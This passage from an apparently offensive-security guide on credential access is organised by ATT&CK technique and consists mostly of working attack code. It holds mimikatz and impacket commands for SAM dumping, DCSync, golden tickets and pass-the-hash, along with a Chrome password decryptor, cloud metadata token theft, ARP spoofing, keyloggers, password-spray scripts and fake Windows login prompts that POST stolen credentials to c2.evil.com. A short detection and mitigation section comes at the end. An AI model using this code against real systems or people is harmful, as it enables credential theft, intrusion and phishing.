 Extract hashes offline
impacket-secretsdump -sam sam.hiv -system system.hiv LOCAL
```

#### Volume Shadow Copy
```powershell
# Create shadow copy
vssadmin create shadow /for=C:

# Copy SAM from shadow copy
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\Temp\SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Temp\SYSTEM

# Clean up
vssadmin delete shadows /for=C: /quiet
```

#### Direct Memory Access
```python
# Python script to extract SAM from memory
import struct
import winreg

def extract_sam_hashes():
    """Extract password hashes from SAM"""
    
    # Open SAM registry key
    sam_key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 
                             r"SAM\SAM\Domains\Account\Users")
    
    hashes = {}
    
    # Enumerate user RIDs
    i = 0
    while True:
        try:
            rid_key = winreg.EnumKey(sam_key, i)
            
            # Open user key
            user_key = winreg.OpenKey(sam_key, rid_key)
            
            # Get username
            username_bytes = winreg.QueryValueEx(user_key, "V")[0]
            username = extract_username(username_bytes)
            
            # Get hash
            hash_bytes = winreg.QueryValueEx(user_key, "F")[0]
            nt_hash = extract_nt_hash(hash_bytes)
            
            hashes[username] = nt_hash
            
            winreg.CloseKey(user_key)
            i += 1
            
        except WindowsError:
            break
    
    winreg.CloseKey(sam_key)
    return hashes

def extract_nt_hash(data):
    """Extract NT hash from SAM data structure"""
    # NT hash offset in V value
    nt_hash_offset = 0xA8
    nt_hash = data[nt_hash_offset:nt_hash_offset+16]
    
    # Decrypt with SYSKEY
    decrypted = decrypt_hash(nt_hash)
    
    return decrypted.hex()
```

### 1.3 DCSync Attack (T1003.006)

Impersonate Domain Controller to request password hashes.

```powershell
# Mimikatz DCSync
mimikatz.exe "lsadump::dcsync /domain:corporate.local /user:Administrator" "exit"

# DCSync all users
mimikatz.exe "lsadump::dcsync /domain:corporate.local /all /csv" "exit"

# PowerShell implementation
Import-Module DSInternals

$creds = Get-Credential
$dc = "dc01.corporate.local"

# Request hash for specific user
Get-ADReplAccount -SamAccountName Administrator -Domain corporate.local -Server $dc -Credential $creds
```

#### Custom DCSync Implementation
```python
from impacket.dcerpc.v5 import drsuapi, transport
from impacket.dcerpc.v5.dtypes import NULL

def dcsync_user(domain, username, dc_ip, user, password):
    """Custom DCSync implementation"""
    
    # Connect to DRSUAPI
    binding = f"ncacn_ip_tcp:{dc_ip}[135]"
    rpc_transport = transport.DCERPCTransportFactory(binding)
    rpc_transport.set_credentials(user, password, domain)
    
    dce = rpc_transport.get_dce_rpc()
    dce.connect()
    dce.bind(drsuapi.MSRPC_UUID_DRSUAPI)
    
    # DRSBind
    request = drsuapi.DRSBind()
    request['puuidClientDsa'] = drsuapi.NTDSAPI_CLIENT_GUID
    drs_bind = drsuapi.DRS_EXTENSIONS_INT()
    request['pextClient']['cb'] = len(drs_bind)
    request['pextClient']['rgb'] = list(str(drs_bind))
    
    resp = dce.request(request)
    drs_handle = resp['phDrs']
    
    # DRSCrackNames to get user DN
    request = drsuapi.DRSCrackNames()
    request['hDrs'] = drs_handle
    request['dwInVersion'] = 1
    
    name_request = drsuapi.DRS_MSG_CRACKREQ_V1()
    name_request['formatOffered'] = drsuapi.DS_NT4_ACCOUNT_NAME
    name_request['formatDesired'] = drsuapi.DS_UNIQUE_ID_NAME
    name_request['rpNames'][0]['pName'] = f"{domain}\\{username}"
    
    request['pmsgIn']['V1'] = name_request
    resp = dce.request(request)
    
    user_dn = resp['pmsgOut']['V1']['pResult']['rItems'][0]['pDomain']
    
    # DRSGetNCChanges to get credentials
    request = drsuapi.DRSGetNCChanges()
    request['hDrs'] = drs_handle
    request['dwInVersion'] = 8
    
    nc_request = drsuapi.DRS_MSG_GETCHGREQ_V8()
    nc_request['uuidDsaObjDest'] = drsuapi.NTDSAPI_CLIENT_GUID
    nc_request['uuidInvocIdSrc'] = NULL
    nc_request['pNC']['Guid'] = user_dn
    
    request['pmsgIn']['V8'] = nc_request
    resp = dce.request(request)
    
    # Extract hashes from response
    hashes = extract_hashes_from_drsuapi(resp)
    
    dce.disconnect()
    return hashes
```

### 1.4 Kerberos Ticket Extraction (T1558)

#### Golden Ticket Attack
```powershell
# Create Golden Ticket (requires krbtgt hash)
mimikatz.exe "kerberos::golden /domain:corporate.local /sid:S-1-5-21-... /krbtgt:hash /user:Administrator /id:500 /ptt" "exit"

# Use ticket
dir \\dc01\C$
```

#### Silver Ticket Attack
```powershell
# Create Silver Ticket (requires service account hash)
mimikatz.exe "kerberos::golden /domain:corporate.local /sid:S-1-5-21-... /target:server01.corporate.local /service:cifs /rc4:hash /user:Administrator /ptt" "exit"
```

#### Kerberoasting
```powershell
# Request service tickets
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "HTTP/server01.corporate.local"

# Export tickets
mimikatz.exe "kerberos::list /export" "exit"

# Crack offline with hashcat
hashcat -m 13100 tickets.txt wordlist.txt
```

**Kerberoasting Script**:
```powershell
# Automated Kerberoasting
function Invoke-Kerberoast {
    # Find SPNs
    $searcher = [adsisearcher]"(&(objectCategory=person)(servicePrincipalName=*))"
    $searcher.PropertiesToLoad.Add("servicePrincipalName") | Out-Null
    $searcher.PropertiesToLoad.Add("samAccountName") | Out-Null
    
    $results = $searcher.FindAll()
    
    foreach ($result in $results) {
        $spn = $result.Properties["serviceprincipalname"][0]
        $sam = $result.Properties["samaccountname"][0]
        
        Write-Host "[*] Requesting ticket for: $sam ($spn)"
        
        # Request service ticket
        Add-Type -AssemblyName System.IdentityModel
        $ticket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $spn
        
        # Export ticket
        $ticketBytes = $ticket.GetRequest()
        
        # Save to file for cracking
        [System.IO.File]::WriteAllBytes("$sam.kirbi", $ticketBytes)
    }
}

Invoke-Kerberoast
```

---

## 2. File-Based Credential Harvesting

### 2.1 Browser Credentials (T1555.003)

#### Chrome Password Extraction
```python
import os
import json
import base64
import sqlite3
from Crypto.Cipher import AES
import win32crypt

def get_chrome_passwords():
    """Extract saved passwords from Chrome"""
    
    # Chrome user data path
    user_data = os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data")
    
    # Get encryption key
    local_state_path = os.path.join(user_data, "Local State")
    with open(local_state_path, 'r') as f:
        local_state = json.loads(f.read())
    
    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    encrypted_key = encrypted_key[5:]  # Remove 'DPAPI' prefix
    key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    
    # Connect to Login Data database
    login_db = os.path.join(user_data, "Default", "Login Data")
    
    # Copy to temp (file is locked)
    temp_db = os.path.join(os.getenv('TEMP'), 'LoginData.db')
    os.system(f'copy "{login_db}" "{temp_db}"')
    
    conn = sqlite3.connect(temp_db)
    cursor = conn.cursor()
    
    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
    
    credentials = []
    
    for row in cursor.fetchall():
        url = row[0]
        username = row[1]
        encrypted_password = row[2]
        
        # Decrypt password
        try:
            # Remove version prefix
            nonce = encrypted_password[3:15]
            ciphertext = encrypted_password[15:]
            
            cipher = AES.new(key, AES.MODE_GCM, nonce)
            password = cipher.decrypt(ciphertext)[:-16].decode()
            
            credentials.append({
                'url': url,
                'username': username,
                'password': password
            })
        except:
            pass
    
    conn.close()
    os.remove(temp_db)
    
    return credentials
```

#### Firefox Password Extraction
```python
import os
import json
from Crypto.Cipher import DES3
import base64

def get_firefox_passwords():
    """Extract Firefox passwords"""
    
    firefox_path = os.path.expandvars(r"%APPDATA%\Mozilla\Firefox\Profiles")
    
    # Find profile directory
    profiles = [d for d in os.listdir(firefox_path) if d.endswith('.default-release')]
    
    if not profiles:
        return []
    
    profile_path = os.path.join(firefox_path, profiles[0])
    
    # Read logins.json
    logins_file = os.path.join(profile_path, "logins.json")
    
    with open(logins_file, 'r') as f:
        logins = json.loads(f.read())
    
    credentials = []
    
    for login in logins['logins']:
        url = login['hostname']
        username = decrypt_firefox(login['encryptedUsername'], profile_path)
        password = decrypt_firefox(login['encryptedPassword'], profile_path)
        
        credentials.append({
            'url': url,
            'username': username,
            'password': password
        })
    
    return credentials

def decrypt_firefox(encrypted_data, profile_path):
    """Decrypt Firefox password using NSS library"""
    # This requires NSS library - simplified version
    # Real implementation would use ctypes to call NSS functions
    pass
```

### 2.2 Windows Credential Manager (T1555.004)

```powershell
# Enumerate stored credentials
cmdkey /list

# Export credentials with mimikatz
mimikatz.exe "dpapi::cred /in:C:\Users\user\AppData\Local\Microsoft\Credentials\*" "exit"
```

**PowerShell Credential Extraction**:
```powershell
function Get-StoredCredentials {
    $credPath = "$env:LOCALAPPDATA\Microsoft\Credentials"
    
    Get-ChildItem $credPath | ForEach-Object {
        $credFile = $_.FullName
        
        # Read credential file
        $bytes = [System.IO.File]::ReadAllBytes($credFile)
        
        # Parse DPAPI blob
        # This is simplified - real parsing is complex
        
        Write-Host "Found credential: $credFile"
    }
}
```

### 2.3 Configuration Files & Scripts

```bash
# Search for credentials in files
grep -r "password" /home/* 2>/dev/null
grep -r "passwd" /etc/* 2>/dev/null
find / -name "*.conf" -exec grep -H "password" {} \; 2>/dev/null

# Common locations
cat ~/.bash_history | grep -i password
cat ~/.ssh/config
cat ~/.aws/credentials
cat ~/.docker/config.json

# Database connection strings
find / -name "web.config" 2>/dev/null
find / -name "*.ini" 2>/dev/null
```

**Automated Credential Scanner**:
```python
import os
import re

def scan_for_credentials(root_path):
    """Scan filesystem for credentials"""
    
    patterns = {
        'password': re.compile(r'password\s*=\s*[\'"]([^\'"]+)[\'"]', re.I),
        'api_key': re.compile(r'api[_-]?key\s*=\s*[\'"]([^\'"]+)[\'"]', re.I),
        'secret': re.compile(r'secret\s*=\s*[\'"]([^\'"]+)[\'"]', re.I),
        'token': re.compile(r'token\s*=\s*[\'"]([^\'"]+)[\'"]', re.I),
    }
    
    interesting_extensions = ['.conf', '.config', '.ini', '.xml', '.json', '.yaml', '.yml', '.env']
    
    credentials = []
    
    for root, dirs, files in os.walk(root_path):
        for file in files:
            if any(file.endswith(ext) for ext in interesting_extensions):
                file_path = os.path.join(root, file)
                
                try:
                    with open(file_path, 'r', errors='ignore') as f:
                        content = f.read()
                        
                        for cred_type, pattern in patterns.items():
                            matches = pattern.findall(content)
                            
                            for match in matches:
                                credentials.append({
                                    'file': file_path,
                                    'type': cred_type,
                                    'value': match
                                })
                except:
                    pass
    
    return credentials
```

### 2.4 Cloud Credentials (T1552.001)

#### AWS Credentials
```bash
# Check for AWS credentials
cat ~/.aws/credentials
cat ~/.aws/config

# EC2 Instance Metadata (SSRF)
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Environment variables
env | grep AWS
```

#### Azure Credentials
```powershell
# Azure CLI credentials
Get-Content "$env:USERPROFILE\.azure\accessTokens.json"
Get-Content "$env:USERPROFILE\.azure\azureProfile.json"

# Managed Identity endpoint (from Azure VM)
$response = Invoke-WebRequest -Uri "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" -Headers @{Metadata="true"}
```

#### GCP Credentials
```bash
# GCP credentials
cat ~/.config/gcloud/credentials.db
cat ~/.config/gcloud/application_default_credentials.json

# Metadata service
curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" -H "Metadata-Flavor: Google"
```

---

## 3. Network-Based Credential Capture

### 3.1 Network Sniffing (T1040)

#### Responder - LLMNR/NBT-NS Poisoning
```bash
# Run Responder to capture NTLMv2 hashes
responder -I eth0 -wrf

# Captured hashes can be cracked with hashcat
hashcat -m 5600 ntlmv2.txt wordlist.txt
```

#### Inveigh - PowerShell LLMNR/NBNS Spoofer
```powershell
# Import Inveigh
Import-Module .\Inveigh.ps1

# Start spoofing
Invoke-Inveigh -ConsoleOutput Y -LLMNR Y -NBNS Y -HTTP Y -FileOutput Y

# View captured hashes
Get-Inveigh CleartextLog
Get-Inveigh NTLMv2Log
```

### 3.2 ARP Spoofing & MitM

```python
from scapy.all import *
import time

def arp_spoof(target_ip, gateway_ip, interface):
    """Perform ARP spoofing attack"""
    
    # Get MAC addresses
    target_mac = getmacbyip(target_ip)
    gateway_mac = getmacbyip(gateway_ip)
    
    print(f"[*] Starting ARP spoofing: {target_ip} <-> {gateway_ip}")
    
    try:
        while True:
            # Tell target that we are the gateway
            send(ARP(op=2, pdst=target_ip, hwdst=target_mac,
                    psrc=gateway_ip), verbose=False)
            
            # Tell gateway that we are the target
            send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac,
                    psrc=target_ip), verbose=False)
            
            time.sleep(2)
            
    except KeyboardInterrupt:
        print("[*] Restoring ARP tables...")
        restore_arp(target_ip, gateway_ip, target_mac, gateway_mac)

def restore_arp(target_ip, gateway_ip, target_mac, gateway_mac):
    """Restore original ARP tables"""
    send(ARP(op=2, pdst=target_ip, hwdst=target_mac,
            psrc=gateway_ip, hwsrc=gateway_mac), count=5, verbose=False)
    send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac,
            psrc=target_ip, hwsrc=target_mac), count=5, verbose=False)
```

### 3.3 Pass-the-Hash (T1550.002)

Use captured NTLM hashes without cracking.

```bash
# Impacket psexec with hash
impacket-psexec -hashes :hash administrator@192.168.1.100

# Impacket wmiexec
impacket-wmiexec -hashes :hash administrator@192.168.1.100

# Impacket smbexec
impacket-smbexec -hashes :hash administrator@192.168.1.100
```

**Mimikatz Pass-the-Hash**:
```powershell
# PTH with mimikatz
mimikatz.exe "sekurlsa::pth /user:Administrator /domain:corporate.local /ntlm:hash /run:powershell.exe" "exit"

# Now use the new PowerShell session
```

### 3.4 Pass-the-Ticket (T1550.003)

```powershell
# Export Kerberos tickets
mimikatz.exe "sekurlsa::tickets /export" "exit"

# Inject ticket into current session
mimikatz.exe "kerberos::ptt ticket.kirbi" "exit"

# Use injected ticket
dir \\dc01\C$
```

---

## 4. User Interaction-Based

### 4.1 Keylogging (T1056.001)

```python
from pynput import keyboard

def on_press(key):
    """Log keystrokes"""
    try:
        with open("keylog.txt", "a") as f:
            f.write(str(key.char))
    except AttributeError:
        with open("keylog.txt", "a") as f:
            f.write(f" [{key}] ")

def start_keylogger():
    """Start keylogger"""
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

# Run keylogger
start_keylogger()
```

**Windows API Keylogger**:
```c
#include <windows.h>
#include <stdio.h>

FILE *log_file;

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT *kbd = (KBDLLHOOKSTRUCT *)lParam;
        
        // Log keystroke
        fprintf(log_file, "%c", kbd->vkCode);
        fflush(log_file);
    }
    
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int main() {
    log_file = fopen("C:\\Windows\\Temp\\log.txt", "a");
    
    // Install keyboard hook
    HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
    
    // Message loop
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    
    fclose(log_file);
    return 0;
}
```

### 4.2 Credential Prompt Injection (T1056.002)

```powershell
# Fake credential prompt
$cred = $host.ui.PromptForCredential("Windows Security", "Please enter your credentials to continue", "", "")

# Send credentials to C2
$username = $cred.UserName
$password = $cred.GetNetworkCredential().Password

Invoke-WebRequest -Uri "http://c2.evil.com/collect" -Method POST -Body @{user=$username;pass=$password}
```

**Advanced Credential Phishing**:
```powershell
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$form = New-Object System.Windows.Forms.Form
$form.Text = "Windows Security"
$form.Size = New-Object System.Drawing.Size(400,200)
$form.StartPosition = "CenterScreen"
$form.TopMost = $true
$form.Icon = [System.Drawing.SystemIcons]::Shield

$label = New-Object System.Windows.Forms.Label
$label.Location = New-Object System.Drawing.Point(10,20)
$label.Size = New-Object System.Drawing.Size(380,40)
$label.Text = "Windows needs your credentials to continue"
$form.Controls.Add($label)

$usernameLabel = New-Object System.Windows.Forms.Label
$usernameLabel.Location = New-Object System.Drawing.Point(10,70)
$usernameLabel.Size = New-Object System.Drawing.Size(100,20)
$usernameLabel.Text = "Username:"
$form.Controls.Add($usernameLabel)

$usernameBox = New-Object System.Windows.Forms.TextBox
$usernameBox.Location = New-Object System.Drawing.Point(120,70)
$usernameBox.Size = New-Object System.Drawing.Size(250,20)
$form.Controls.Add($usernameBox)

$passwordLabel = New-Object System.Windows.Forms.Label
$passwordLabel.Location = New-Object System.Drawing.Point(10,100)
$passwordLabel.Size = New-Object System.Drawing.Size(100,20)
$passwordLabel.Text = "Password:"
$form.Controls.Add($passwordLabel)

$passwordBox = New-Object System.Windows.Forms.TextBox
$passwordBox.Location = New-Object System.Drawing.Point(120,100)
$passwordBox.Size = New-Object System.Drawing.Size(250,20)
$passwordBox.PasswordChar = "*"
$form.Controls.Add($passwordBox)

$okButton = New-Object System.Windows.Forms.Button
$okButton.Location = New-Object System.Drawing.Point(220,140)
$okButton.Size = New-Object System.Drawing.Size(75,23)
$okButton.Text = "OK"
$okButton.DialogResult = [System.Windows.Forms.DialogResult]::OK
$form.AcceptButton = $okButton
$form.Controls.Add($okButton)

$result = $form.ShowDialog()

if ($result -eq [System.Windows.Forms.DialogResult]::OK) {
    $username = $usernameBox.Text
    $password = $passwordBox.Text
    
    # Exfiltrate credentials
    Invoke-WebRequest -Uri "http://c2.evil.com/creds" -Method POST -Body "u=$username&p=$password"
}
```

---

## 5. Brute Force Attacks (T1110)

### 5.1 Password Spraying

```powershell
# CrackMapExec password spray
crackmapexec smb 192.168.1.0/24 -u users.txt -p 'Password123!' --continue-on-success

# Kerbrute password spray
kerbrute passwordspray -d corporate.local users.txt 'Password123!'
```

**Custom Password Spray Script**:
```python
import ldap3
from ldap3 import Server, Connection, ALL

def password_spray(domain, users_file, password, dc_ip):
    """Spray single password against multiple users"""
    
    with open(users_file, 'r') as f:
        users = [line.strip() for line in f.readlines()]
    
    server = Server(dc_ip, get_info=ALL)
    
    valid_creds = []
    
    for user in users:
        try:
            conn = Connection(server, user=f"{domain}\\{user}", password=password)
            
            if conn.bind():
                print(f"[+] Valid credentials: {user}:{password}")
                valid_creds.append((user, password))
                conn.unbind()
            else:
                print(f"[-] Failed: {user}")
                
        except Exception as e:
            print(f"[!] Error with {user}: {e}")
        
        # Sleep to avoid lockout
        time.sleep(30)
    
    return valid_creds
```

### 5.2 Credential Stuffing

```python
import requests

def credential_stuffing(url, credentials_file):
    """Test leaked credentials against target"""
    
    with open(credentials_file, 'r') as f:
        for line in f:
            username, password = line.strip().split(':')
            
            response = requests.post(url, data={
                'username': username,
                'password': password
            })
            
            if "Welcome" in response.text:
                print(f"[+] Valid: {username}:{password}")
```

---

## 6. Detection & Mitigation

### Detection Strategies

```yaml
# Sigma rule for LSASS access
title: LSASS Memory Dump
logsource:
  product: windows
  service: sysmon
detection:
  selection:
    EventID: 10
    TargetImage|endswith: '\lsass.exe'
    GrantedAccess:
      - '0x1410'
      - '0x1fffff'
  condition: selection
level: critical
```

### Mitigation Recommendations

1. **Credential Protection**
   - Windows Credential Guard
   - LSA Protection (RunAsPPL)
   - Disable NTLM where possible
   - Implement LAPS for local admin passwords

2. **Network Segmentation**
   - Disable LLMNR/NBT-NS
   - Enable SMB signing
   - Network access control

3. **Monitoring**
   - LSASS access alerts
   - Unusual authentication patterns
   - Kerberos anomalies
   - DCSync detection

---

## Summary

Credential Access is the cornerstone of advanced persistent threats. Key takeaways:

- **Memory extraction** (LSASS, SAM) provides immediate access
- **File-based harvesting** uncovers stored credentials
- **Network interception** captures credentials in transit
- **User interaction** tricks users into revealing credentials
- **Defense requires** multi-layered protection and monitoring

**Techniques Covered**: 25+ credential access methods across all major attack vectors

---

**Next Phase**: [Phase 7: Discovery →](../07-discovery/README.md)
**Previous Phase**: [← Phase 5: Defense Evasion](../05-defense-evasion/README.md)

---

**Last Updated**: January 2025
**Author**: Advanced Threat Research Team